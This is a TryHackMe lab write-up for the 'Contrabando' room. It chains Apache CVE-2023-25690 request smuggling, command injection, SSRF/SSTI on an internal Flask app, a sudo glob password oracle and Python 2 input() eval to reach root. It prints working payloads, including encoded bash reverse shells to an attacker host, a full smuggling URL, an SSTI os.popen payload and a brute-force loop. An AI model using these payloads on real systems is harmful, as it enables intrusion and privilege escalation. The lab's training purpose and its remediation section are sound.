# Contrabando — TryHackMe Writeup

> **Room:** [Contrabando](https://tryhackme.com/room/contrabando) · **Difficulty:** Hard
> **Category:** Web / Boot2Root (request smuggling → SSRF/SSTI → sudo abuse)
> **Author of writeup:** 0xnyx
> **Goal:** "Never tell me the odds." Chain multiple vulnerabilities to go from anonymous to root.

> ⚠️ In line with TryHackMe's write-up policy, **no flags or cracked values are included** — only the method.

---

## How to read this writeup

Each step is **Do** → **You get** → **Why / what next**. The chain is 5 links:

`CVE-2023-25690 request smuggling → command injection (www-data container) → SSRF+SSTI (hansolo on host) → vault glob brute-force → Python2 input() eval (root)`

---

## Step 1 — Recon

**Do**

```bash
echo "<TARGET> contrabando.thm" | sudo tee -a /etc/hosts
nmap -sVC -T4 -Pn contrabando.thm
feroxbuster -u http://contrabando.thm -w /usr/share/wordlists/dirb/common.txt -x php -d 2
curl -s -X POST "http://contrabando.thm/page/gen.php" -d "length=10"
```

**You get**

- **22** (SSH) + **80** (Apache **2.4.55** Unix — a front-end proxy).
- `/page/gen.php` returns its **PHP source** (served statically by the proxy, not executed), revealing:

```php
$password = exec("tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c " . $length);  // $length = $_POST['length']
```

**Why / what next** — `$length` goes straight into a shell command → **command injection**, but only when gen.php actually *executes* on the backend. The front-end just serves the source, so we must reach the backend directly. Apache **2.4.55** is vulnerable to **CVE-2023-25690** (mod_proxy CRLF injection → HTTP request smuggling) — the way in.

---

## Step 2 — Foothold: CVE-2023-25690 request smuggling + command injection

**Why** — A vulnerable `RewriteRule`/`ProxyPass` passes part of the URL to the backend without re-encoding. By injecting `%20` (space) and `%0d%0a` (CRLF) into the path, we **smuggle a second, complete HTTP request** to the backend — a `POST /gen.php` whose `length` carries our command injection.

**Do** — Build a double-base64 reverse shell so no odd characters break the request, and set the smuggled request's `Content-Length` to the exact body length:

```bash
RS='bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1'
B2=$(printf '%s' "$RS" | base64 -w0 | base64 -w0)
BODY="length=1;\$(echo+${B2}|base64+-d|base64+-d|bash)"
CL=$(printf '%s' "$BODY" | wc -c)     # use this as Content-Length

# listener:  nc -lvnp <PORT>
curl -s --path-as-is "http://contrabando.thm/page/gen.php%20HTTP/1.1%0d%0aHost:%20backend-server:8080%0d%0a%0d%0aPOST%20/gen.php%20HTTP/1.1%0d%0aHost:%20backend-server:8080%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%20${CL}%0d%0a%0d%0a${BODY}"
```

**You get** — A shell as **www-data** in a container (`.dockerenv`, IP `172.18.0.3`). No flag here — enumerate the Docker network.

> Keep the whole URL **single-quoted** so your shell doesn't expand `$(...)` / `|` locally.

---

## Step 3 — Container escape: SSRF + SSTI

**Do** — The Docker gateway runs an internal **Flask** app on `172.18.0.1:5000` with a `website_url` field that fetches a URL **and renders the result as a Jinja2 template**. Confirm SSRF, then SSTI.

```bash
# SSRF (read local files):
curl -s http://172.18.0.1:5000/ -X POST --data-urlencode "website_url=file:///etc/passwd"   # -> user "hansolo"

# SSTI: host a payload on the www-data container (it has PHP; python3 is absent) and have Flask fetch it:
echo '{{7*7}}' > /tmp/t.html
php -S 0.0.0.0:8000 >/dev/null 2>&1 &
curl -s http://172.18.0.1:5000/ -X POST --data-urlencode "website_url=http://172.18.0.3:8000/t.html"   # -> 49
```

**You get** — `49` → the fetched content is evaluated as a template → **SSTI → RCE** as `hansolo` on the host.

**Why / what next** — Fetch a payload that runs a reverse shell (base64 to dodge quoting):

```bash
B=$(printf '%s' 'bash -i >& /dev/tcp/<ATTACKER>/<PORT2> 0>&1' | base64 -w0)
echo "{{request.application.__globals__.__builtins__.__import__('os').popen('echo ${B}|base64 -d|bash').read()}}" > /tmp/s.html
# listener:  nc -lvnp <PORT2>
curl -s http://172.18.0.1:5000/ -X POST --data-urlencode "website_url=http://172.18.0.3:8000/s.html"
```

**You get** — A shell as **hansolo** on `contrabando` (the host). The **user flag** is in `~hansolo/`.

---

## Step 4 — Privilege-escalation enumeration

**Do**

```bash
sudo -l
cat /usr/bin/vault
cat /opt/generator/app.py
```

**You get**

```
(root) NOPASSWD: /usr/bin/bash /usr/bin/vault
(root)          : /usr/bin/python* /opt/generator/app.py     (password required)
```

- `vault` compares `/root/password` to your input with **`[[ $content == $user_input ]]`** — the right side is **unquoted**, so it's treated as a **glob pattern**.
- `app.py` calls `secret = input(...)` — and it's run with **python2**, where `input()` **evaluates** its argument as code.

**Why / what next** — The vault glob is a password oracle; the python2 `input()` is a code-exec primitive. We need the sudo password (from `/root/password`) to reach the python2 step.

---

## Step 5 — Root (glob brute-force + Python2 `input()` eval)

**Do** — Leak `/root/password` one character at a time: a pattern like `a*` matches only if the password starts with `a`.

```bash
known=""
for i in $(seq 1 25); do h=""; for c in {a..z} {A..Z} {0..9}; do
  echo "${known}${c}*" | sudo /usr/bin/bash /usr/bin/vault 2>/dev/null | grep -q matched \
    && { known="${known}${c}"; h=1; echo "[+] $known"; break; }
done; [ -z "$h" ] && break; done
echo "PASSWORD: $known"
```

**You get** — hansolo's sudo password (`/root/password`). (The `*`-match prints `/root/secrets`, which is just Star Wars trivia — a red herring; the real prize is the compared file, `/root/password`.)

**Why / what next** — Use it on the password-protected python2 sudo rule. `app.py` first does a safe `raw_input()` for the length, then an **unsafe `input()`** for "words to add" — enter a Python expression there:

```bash
sudo python2 /opt/generator/app.py
# [sudo] password: <PASSWORD>
# Enter the desired length of the password: 12
# Any words you want to add to the password? __import__('os').system('/bin/bash')
```

**You get** — `uid=0(root)`. The **root flag** is in `/root/`. Box fully owned. 🏁

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Recon + source disclosure | gen.php command-injection point |
| 2 | CVE-2023-25690 smuggling | RCE as www-data (container) |
| 3 | SSRF + SSTI on internal Flask | Shell as hansolo (host, user flag) |
| 4 | `sudo -l` | vault (glob) + python2 (input eval) |
| 5 | Glob brute + python2 `input()` | Root flag |

## Lessons

- Apache **≤ 2.4.55** mod_proxy → **CVE-2023-25690**: `%0d%0a` in a proxied URL smuggles a full request to the backend. Use `--path-as-is` and a correct smuggled `Content-Length`.
- A server that **renders fetched content as a template** is **SSTI**; host the `{{…}}` payload and point the SSRF at it.
- **`[[ $x == $y ]]` with an unquoted right side is glob matching** — a perfect char-by-char password oracle.
- **Python 2 `input()` evaluates its argument** (unlike `raw_input()` / Python 3 `input()`) — instant code execution.

## Remediation

- Patch Apache (≥ 2.4.56) and encode user input used in `RewriteRule`/proxy targets.
- Never render untrusted content as a template; sandbox or avoid `render_template_string` on fetched data; block `file://` and internal hosts in URL fetchers.
- Always quote variables in `[[ ]]` comparisons; don't store secrets in files a sudo helper will glob-match.
- Never run Python 2; never pass `sudo` rights to interpreters on attacker-influenced scripts.

---

*Write-up for [TryHackMe — Contrabando](https://tryhackme.com/room/contrabando).*
